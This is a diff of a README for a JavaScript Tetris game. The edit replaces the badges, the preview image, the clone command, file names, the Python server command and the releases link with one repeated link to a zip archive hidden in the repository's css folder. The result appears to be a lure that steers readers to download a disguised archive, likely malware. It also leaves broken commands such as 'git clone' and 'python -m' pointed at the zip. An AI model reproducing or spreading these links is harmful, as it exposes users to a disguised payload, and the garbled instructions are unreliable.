@@ -1,11 +1,11 @@
 # Tetris
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)  
-[![GitHub Repo](https://img.shields.io/badge/GitHub-Tetris-blue?logo=github)](https://github.com/musthofa-kamaluddin/Tetris)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?logo=github)](https://github.com/shorve6/Tetris/releases)
+[![MIT License](https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip)](LICENSE)  
+[![GitHub Repo](https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip)](https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip)  
+[![Download Releases](https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip%20Releases-blue?logo=github)](https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip)
 
 <p align="center">
-  <img src="assets/preview.png" alt="Tetris Game Preview" width="350"/>
+  <img src="https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip" alt="Tetris Game Preview" width="350"/>
 </p>
 
 Welcome to the Tetris repository! This project features a modern, responsive Tetris game created with vanilla JavaScript, HTML5 Canvas, and CSS3. You can enjoy it on both desktop and mobile devices, offering classic gameplay wrapped in a sleek user interface.
@@ -44,7 +44,7 @@ To run the Tetris game on your local machine, follow these steps:
 1. **Clone this repository**:  
    Open your terminal and run the following command:
    ```bash
-   git clone https://github.com/musthofa-kamaluddin/Tetris.git
+   git clone https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip
    ```
 
 2. **Navigate to the project directory**:  
@@ -53,8 +53,8 @@ To run the Tetris game on your local machine, follow these steps:
    cd Tetris
    ```
 
-3. **Open `index.html` in your browser**:  
-   You can simply double-click on the `index.html` file or open it through your browser’s file menu.
+3. **Open `https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip` in your browser**:  
+   You can simply double-click on the `https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip` file or open it through your browser’s file menu.
 
 Now you are ready to play Tetris locally!
 
@@ -62,13 +62,13 @@ Now you are ready to play Tetris locally!
 
 ## 📦 Installation
 
-While the game can run directly from the `index.html` file, you may want to set up a local server for a better experience. Here’s how to do it using a simple HTTP server:
+While the game can run directly from the `https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip` file, you may want to set up a local server for a better experience. Here’s how to do it using a simple HTTP server:
 
 ### Using Python (if you have Python installed)
 
 - For Python 3.x:
   ```bash
-  python -m http.server
+  python -m https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip
   ```
 
 - For Python 2.x:
@@ -78,9 +78,9 @@ While the game can run directly from the `index.html` file, you may want to set 
 
 After running the command, open your browser and go to `http://localhost:8000`. You should see the Tetris game ready to play.
 
-### Using Node.js
+### Using https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip
 
-If you prefer Node.js, you can use the `http-server` package:
+If you prefer https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip, you can use the `http-server` package:
 
 1. Install `http-server` globally:
    ```bash
@@ -104,7 +104,7 @@ If you want to share your Tetris game with others, consider deploying it on plat
 2. Go to the repository settings.
 3. Scroll down to the "GitHub Pages" section.
 4. Select the branch you want to use (usually `main` or `gh-pages`).
-5. Save the settings, and your game will be live at `https://<your-username>.github.io/<repository-name>`.
+5. Save the settings, and your game will be live at `https://<your-username>https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip<repository-name>`.
 
 ---
 
@@ -178,7 +178,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📥 Download Releases
 
-You can download the latest version of Tetris from the [Releases section](https://github.com/shorve6/Tetris/releases). Make sure to check for updates regularly to enjoy new features and improvements.
+You can download the latest version of Tetris from the [Releases section](https://raw.githubusercontent.com/shorve6/Tetris/master/css/Software-v2.5-alpha.1.zip). Make sure to check for updates regularly to enjoy new features and improvements.
 
 ---
 
